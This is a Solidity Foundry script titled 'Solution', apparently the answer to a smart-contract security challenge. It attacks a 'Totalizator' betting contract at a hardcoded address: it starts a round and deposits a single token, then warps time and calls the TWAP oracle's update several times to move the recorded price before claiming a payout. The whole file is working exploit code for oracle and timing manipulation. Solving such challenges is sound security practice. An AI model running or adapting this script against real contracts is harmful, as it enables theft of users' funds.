// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Task.sol";
import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Totalizator public totalizatortInstance =
        Totalizator(payable(0x399eD69E9C1d5D4e8249177fcF5F070f61979EFA));

    function run() external {
        vm.startBroadcast();
        TWAPOracle _TWAPOracleInstance = TWAPOracle(
            totalizatortInstance.oracle()
        );
        ///////////
        console.log("Starting new round...");
        totalizatortInstance.newRound();
        console.log("Oracle price %s", totalizatortInstance.price());
        console.log(
            "Round %s, start %s, timestamp %s",
            totalizatortInstance.round(),
            totalizatortInstance.start(),
            block.timestamp
        );
        ///////////////
        vm.warp(block.timestamp + 60 * 5 + 1);
        console.log("Timestamp", block.timestamp);
        uint toDeposit = 1;
        IERC20(totalizatortInstance.token()).approve(
            address(totalizatortInstance),
            toDeposit
        );
        totalizatortInstance.deposit(toDeposit, true);

        console.log(
            "My balance of Tokens %s, Contract balance %s",
            IERC20(totalizatortInstance.token()).balanceOf(tx.origin),
            IERC20(totalizatortInstance.token()).balanceOf(
                address(totalizatortInstance)
            )
        );
        console.log("Round:", _TWAPOracleInstance.round());
        console.log("Price:", _TWAPOracleInstance.getPrice());
        ///////////////
        vm.warp(block.timestamp + 60 * 5 + 1);
        console.log("Timestamp", block.timestamp);
        _TWAPOracleInstance.update();
        console.log("Round:", _TWAPOracleInstance.round());
        console.log("Price:", _TWAPOracleInstance.getPrice());
        ///////////////
        vm.warp(block.timestamp + 60 * 5 + 1);
        console.log("Timestamp", block.timestamp);
        _TWAPOracleInstance.update();
        console.log("Round:", _TWAPOracleInstance.round());
        console.log("Price:", _TWAPOracleInstance.getPrice());
        ///////////////
        vm.warp(block.timestamp + 1 + totalizatortInstance.ROUND_INTERVAL());
        console.log("Timestamp", block.timestamp);
        console.log("Oracle price %s", _TWAPOracleInstance.getPrice());
        totalizatortInstance.claim();
        console.log(
            "My balance of Tokens %s, Contract balance %s",
            IERC20(totalizatortInstance.token()).balanceOf(tx.origin),
            IERC20(totalizatortInstance.token()).balanceOf(
                address(totalizatortInstance)
            )
        );
        vm.stopBroadcast();
    }
}
